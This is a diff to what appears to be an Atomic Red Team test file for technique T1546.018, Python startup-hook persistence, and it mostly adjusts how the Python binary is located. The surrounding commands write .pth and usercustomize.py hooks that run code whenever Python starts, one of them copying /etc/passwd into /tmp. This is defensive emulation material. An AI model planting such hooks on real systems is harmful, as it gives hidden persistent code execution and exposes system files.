@@ -17,7 +17,7 @@ atomic_tests:
       - description: |
           Python must be installed and the specified binary (#{python_exe}) must be in the PATH.
         prereq_command: |
-          if (Get-Command #{python_exe} -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
+          if (Get-Command @("#{python_exe}", 'python3.exe') -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
         get_prereq_command: |
           Write-Host "[!] Python3 not found. Please install Python3 (e.g., winget install python3 or winget install python or https://www.python.org/downloads/windows/) or ensure it is in your PATH."
     executor:
@@ -56,7 +56,7 @@ atomic_tests:
       - description: |
           Python must be installed and the specified binary (#{python_exe}) must be in the PATH.
         prereq_command: |
-          if (Get-Command #{python_exe} -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
+          if (Get-Command @("#{python_exe}", 'python3.exe') -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
         get_prereq_command: |
           Write-Host "[!] Python3 not found. Please install Python3 (e.g., winget install python3 or winget install python or https://www.python.org/downloads/windows/) or ensure it is in your PATH."
     executor:
@@ -95,7 +95,7 @@ atomic_tests:
       - description: |
           Python must be installed and the specified binary (#{python_exe}) must be in the PATH.
         prereq_command: |
-          PYTHON_CMD=$(command -v python3 || command -v python)
+          PYTHON_CMD=$(command -v #{python_exe} || command -v python)
           if [ -z "$PYTHON_CMD" ]; then exit 1; fi
           $PYTHON_CMD -m venv --help >/dev/null 2>&1
         get_prereq_command: |
@@ -110,7 +110,7 @@ atomic_tests:
         SITE_PACKAGES=$("$TEMPDIR/env/bin/#{python_exe}" -c "import site; print(site.getsitepackages()[0])")
         echo "import os; os.system('cat /etc/passwd 1> /tmp/atomic_hook_poc.txt')" > "$SITE_PACKAGES/atomic_hook.pth"
         ls -la "$SITE_PACKAGES/atomic_hook.pth"
-        "$TEMPDIR/env/bin/#{python_exe}" -c "print('Triggering Hook via atomic_hook...')"
+        "$TEMPDIR/env/bin/python" -c "print('Triggering Hook via atomic_hook...')"
         if [ -f /tmp/atomic_hook_poc.txt ]; then echo "[+] Success: atomic_hook_poc.txt created under /tmp \n" $(ls -la /tmp/ | grep -w atomic_hook_poc.txt); else echo "Failed: /tmp/atomic_hook_poc.txt not found"; fi
       cleanup_command: |
         if [ ! -f /tmp/atomic_hook_poc.txt ] || [ ! -d /tmp/atomic_sitecust_posix ]; then echo "[!] Missing artifact or folder: /tmp/atomic_hook_poc.txt or /tmp/atomic_sitecust_posix — [-] Please Run : Invoke-AtomicTest T1546.018"; exit 0; fi
@@ -137,7 +137,7 @@ atomic_tests:
     dependencies:
       - description: Python must be installed and the specified binary (#{python_exe}) must be in the PATH.
         prereq_command: |
-          PYTHON_CMD=$(command -v python || command -v python3)
+          PYTHON_CMD=$(command -v python || command -v #{python_exe})
           if [ -z "$PYTHON_CMD" ]; then exit 1; fi
           $PYTHON_CMD -m venv --help >/dev/null 2>&1
         get_prereq_command: |
@@ -146,13 +146,13 @@ atomic_tests:
       name: sh
       elevation_required: false
       command: |
-        PYTHON_EXE=$(command -v #{python_exe})
+        PYTHON_EXE=$(command -v #{python_exe} || command -v python)
         TEMPDIR=$(mktemp -d /tmp/atomic_python_hook_XX)
         echo "$TEMPDIR" > /tmp/atomic_python_hook_path.txt
         $PYTHON_EXE -m venv "$TEMPDIR/env"
         SITE_PACKAGES=$("$TEMPDIR/env/bin/#{python_exe}" -c "import site; print(site.getsitepackages()[0])")
         echo "import subprocess; subprocess.Popen(['open', '-a', '#{exe_name}'])" > "$SITE_PACKAGES/atomic_hook.pth"
-        "$TEMPDIR/env/bin/#{python_exe}" -c "print('Triggering Hook via atomic_hook...')"
+        "$TEMPDIR/env/bin/python" -c "print('Triggering Hook via atomic_hook...')"
       cleanup_command: |
         if [ ! -f /tmp/atomic_python_hook_path.txt ] || [ ! -d $(cat /tmp/atomic_python_hook_path.txt) ]; then echo "[!] Artifact missing: /tmp/atomic_python_hook_path.txt — [-] Please Run : Invoke-AtomicTest T1546.018"; exit 0; fi
         pkill "#{exe_name}" || true
@@ -176,7 +176,7 @@ atomic_tests:
       - description: |
           Python must be installed and the specified binary (#{python_exe}) must be in the PATH.
         prereq_command: |
-          PYTHON_CMD=$(command -v python || command -v python3)
+          PYTHON_CMD=$(command -v #{python_exe} || command -v python)
           if [ -z "$PYTHON_CMD" ]; then exit 1; fi
           $PYTHON_CMD -m venv --help >/dev/null 2>&1
         get_prereq_command: |
@@ -185,7 +185,7 @@ atomic_tests:
       name: sh
       elevation_required: false
       command: |
-        PYTHON_EXE=$(command -v #{python_exe})
+        PYTHON_EXE=$(command -v #{python_exe} || command -v python)
         USER_PACKAGES=$($PYTHON_EXE -c "import site; print(site.getusersitepackages())")
         mkdir -p "$USER_PACKAGES"
         echo "import os; os.system('date > /tmp/poc.txt')" > "$USER_PACKAGES/usercustomize.py"
@@ -193,7 +193,7 @@ atomic_tests:
         $PYTHON_EXE -c "print('Triggering Hook via usercustomize.py...')"
         if [ -f /tmp/poc.txt ]; then echo "Success: poc.txt created under /tmp\n" $(ls -la /tmp/ | grep -w poc.txt); else echo "Failed: /tmp/poc.txt not found"; fi
       cleanup_command: |
-        PYTHON_CMD=$(command -v python || command -v python3)
+        PYTHON_CMD=$(command -v #{python_exe} || command -v python)
         USER_PACKAGES=$($PYTHON_CMD -c "import site; print(site.getusersitepackages())")
         if [ ! -f /tmp/poc.txt ] || [ ! -f $USER_PACKAGES/usercustomize.py ]; then echo "[!] Artifact missing: /tmp/poc.txt and $USER_PACKAGES/usercustomize.py — [-] Please Run : Invoke-AtomicTest T1546.018"; exit 0; fi
         if [ -e "$USER_PACKAGES"/usercustomize* ]; then echo "[+] Successful remove $USER_PACKAGES/usercustomize.py\n" $(rm -rf "$USER_PACKAGES"/usercustomize*); else echo "usercustomize.py not found under $USER_PACKAGES"; fi
